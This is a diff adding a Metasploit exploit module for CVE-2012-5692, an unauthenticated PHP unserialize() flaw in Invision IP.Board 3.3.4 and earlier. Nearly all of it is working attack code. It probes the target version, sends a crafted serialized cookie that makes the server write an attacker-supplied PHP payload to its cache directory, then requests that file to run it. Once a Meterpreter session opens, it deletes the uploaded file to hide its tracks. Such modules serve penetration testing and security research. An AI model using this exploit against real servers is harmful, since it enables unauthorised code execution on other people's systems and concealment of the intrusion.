@@ -1,0 +1,148 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+	include Msf::Exploit::PhpEXE
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Invision IP.Board <= 3.3.4 unserialize() PHP Code Execution',
+			'Description'    => %q{
+					This module exploits a php unserialize() vulnerability in Invision IP.Board
+				<= 3.3.4 which could be abused to allow unauthenticated users to execute arbitrary
+				code under the context of the webserver user.
+
+				The dangerous unserialize() exists in the '/admin/sources/base/core.php' script,
+				which is called with user controlled data from the cookie. The exploit abuses the
+				__destruct() method from the dbMain class to write arbitrary PHP code to a file on
+				the Invision IP.Board web directory.
+
+				The exploit has been tested successfully on Invision IP.Board 3.3.4.
+			},
+			'Author'	=>
+				[
+					'EgiX',         # Vulnerability discovery and PoC
+					'juan vazquez', # Metasploit module
+					'sinn3r'        # PhpEXE tekniq & check() method
+				],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'CVE', '2012-5692' ],
+					[ 'OSVDB', '86702' ],
+					[ 'BID', '56288' ],
+					[ 'EDB', '22398' ],
+					[ 'URL', 'http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-critical-security-update/' ]
+				],
+			'Privileged'     => false,
+			'Platform'       => ['php'],
+			'Arch'           => ARCH_PHP,
+			'Payload'        =>
+				{
+					'Space'       => 8000, #Apache's limit for GET
+					'DisableNops' => true
+				},
+			'Targets'        => [ ['Invision IP.Board 3.3.4', {}] ],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Oct 25 2012'
+			))
+
+		register_options(
+			[
+				OptString.new('TARGETURI', [ true, "The base path to the web application", "/forums/"])
+			], self.class)
+	end
+
+	def base
+		base = target_uri.path
+		base << '/' if base[-1, 1] != '/'
+		return base
+	end
+
+	def check
+		res = send_request_raw({'uri'=>"#{base}index.php"})
+		return Exploit::CheckCode::Unknown if not res
+
+		version = res.body.scan(/Community Forum Software by IP\.Board (\d+)\.(\d+).(\d+)/).flatten
+		version = version.map {|e| e.to_i}
+
+		# We only want major version 3
+		# This version checking is based on OSVDB's info
+		return Exploit::CheckCode::Safe if version[0] != 3
+
+		case version[1]
+		when 1
+			return Exploit::CheckCode::Vulnerable if version[2].between?(0, 4)
+		when 2
+			return Exploit::CheckCode::Vulnerable if version[2].between?(0, 3)
+		when 3
+			return Exploit::CheckCode::Vulnerable if version[2].between?(0, 4)
+		end
+
+		return Exploit::CheckCode::Safe
+	end
+
+	def on_new_session(client)
+		if client.type == "meterpreter"
+			client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
+			begin
+				print_warning("#{@peer} - Deleting #{@upload_php}")
+				client.fs.file.rm(@upload_php)
+				print_good("#{@peer} - #{@upload_php} removed to stay ninja")
+			rescue
+				print_error("#{@peer} - Unable to remove #{f}")
+			end
+		end
+	end
+
+	def exploit
+		@upload_php = rand_text_alpha(rand(4) + 4) + ".php"
+		@peer = "#{rhost}:#{rport}"
+
+		# get_write_exec_payload uses a function, which limits our ability to support
+		# Linux payloads, because that requires a space:
+		#   function my_cmd
+		# becomes:
+		#   functionmy_cmd #Causes parsing error
+		# We'll have to address that in the mixin, and then come back to this module
+		# again later.
+		php_payload = get_write_exec_payload(:unlink_self=>true)
+		php_payload = php_payload.gsub(/^\<\?php/, '<?')
+		php_payload = php_payload.gsub(/ /,'')
+
+		db_driver_mysql = "a:1:{i:0;O:15:\"db_driver_mysql\":1:{s:3:\"obj\";a:2:{s:13:\"use_debug_log\";i:1;s:9:\"debug_log\";s:#{"cache/#{@upload_php}".length}:\"cache/#{@upload_php}\";}}}"
+
+		print_status("#{@peer} - Exploiting the unserialize() to upload PHP code")
+
+		res = send_request_cgi(
+		{
+			'uri' => "#{base}index.php?#{php_payload}",
+			'method' => 'GET',
+			'cookie' => "member_id=#{Rex::Text.uri_encode(db_driver_mysql)}"
+		})
+
+		if not res or res.code != 200
+			print_error("#{@peer} - Exploit failed: #{res.code}")
+			return
+		end
+
+		print_status("#{@peer} - Executing the payload #{@upload_php}")
+
+		res = send_request_raw({'uri' => "#{base}cache/#{@upload_php}"})
+
+		if res
+			print_error("#{@peer} - Payload execution failed: #{res.code}")
+			return
+		end
+
+	end
+end
